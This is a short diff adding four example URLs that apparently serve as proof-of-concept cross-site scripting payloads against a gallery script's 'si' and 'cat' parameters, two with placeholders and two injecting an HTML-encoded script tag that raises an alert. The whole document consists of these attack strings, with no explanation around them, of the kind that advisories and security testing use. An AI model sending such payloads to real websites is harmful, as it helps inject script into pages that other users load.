@@ -1,0 +1,4 @@
+http://www.example.com/showgallery.php?si=&quot; [XSS] &quot;
+http://www.example.com/showgallery.php?cat=&quot;[XSS]&quot;
+http://www.example.com/showgallery.php?si=&quot;&lt;script&gt;alert(12345)&lt;/script&gt;&quot;
+http://www.example.com/showgallery.php?cat=&quot;&lt;script&gt;alert(12345)&lt;/script&gt;&quot;
